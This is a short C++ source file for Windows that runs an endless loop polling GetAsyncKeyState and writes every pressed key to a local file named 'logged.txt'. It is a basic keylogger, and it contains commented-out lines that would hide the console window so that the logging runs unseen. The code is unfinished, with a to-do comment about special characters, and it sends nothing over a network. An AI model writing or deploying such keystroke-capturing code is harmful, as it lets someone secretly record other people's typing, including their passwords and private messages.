#include <iostream>
#include <fstream>
#include <windows.h>
#include <winuser.h>
#include <time.h>
using namespace std;

#define LOG_FILE "logged.txt"
ofstream outputLog (LOG_FILE);


int main()
{
    // IMPLEMENT SPECIAL CHARACTERS

    // HWND hwnd = GetConsoleWindow();
    // ShowWindow(hwnd, SW_HIDE);

    while (true) {
        for (int i = 8; i <= 190; i++) {
            if (GetAsyncKeyState((char)i) & 0xF) {
                outputLog.put((char)i);
                outputLog.put('\n');
            }
        }
    }

    return 0;
}